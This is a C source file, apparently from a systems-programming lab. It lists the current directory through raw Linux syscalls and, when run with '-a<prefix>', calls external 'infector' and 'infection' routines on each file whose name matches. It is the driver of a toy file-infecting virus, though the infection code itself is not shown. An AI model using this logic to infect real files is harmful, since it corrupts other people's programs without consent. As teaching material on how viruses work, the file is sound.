#include "util.h"
extern void infection();
extern void infector(char* filename);
extern int system_call(int syscall_number, ...);
#define BUFFER_SIZE 8192
#define STDOUT 1

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

int main(int argc, char *argv[]) {
    char buf[BUFFER_SIZE];
    int fd, nread;
    struct linux_dirent *d;
    int bpos;
    char* prefix = 0;

    /* Check for -a flag */
    if (argc > 1 && argv[1][0] == '-' && argv[1][1] == 'a') {
        prefix = &argv[1][2];
    }

    /* Open current directory */
    fd = system_call(5, ".", 0, 0);  /* sys_open */
    if (fd < 0) {
        return 0x55;
    }

    /* Read directory entries */
    nread = system_call(141, fd, buf, BUFFER_SIZE);  /* sys_getdents */
    if (nread < 0) {
        system_call(6, fd);  /* sys_close */
        return 0x55;
    }

    /* Process directory entries */
    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent *)(buf + bpos);
        
        /* Print filename */
        system_call(4, STDOUT, d->d_name, strlen(d->d_name));

        /* If we have a prefix and the filename matches it */
        if (prefix && strncmp(d->d_name, prefix, strlen(prefix)) == 0) {
            system_call(4, STDOUT, " ", 1);
            
            infector(d->d_name);
            
            system_call(4, STDOUT, "\n", 1);
            
            infection();
        } 
        else {
            system_call(4, STDOUT, "\n", 1);
        }

        bpos += d->d_reclen;
    }

    system_call(6, fd);  /* sys_close */
    return 0;
}